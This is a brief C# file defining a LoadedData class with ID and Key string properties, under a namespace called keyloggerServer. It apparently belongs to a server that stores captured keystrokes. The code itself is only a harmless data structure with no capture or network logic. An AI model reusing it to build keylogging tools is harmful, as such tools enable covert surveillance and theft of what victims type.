namespace keyloggerServer;

public class LoadedData
{
    public string ID { get; set; }
    public string Key { get; set; }
    
    public override string ToString()
    {
        return $"Key: {Key}";
    }
}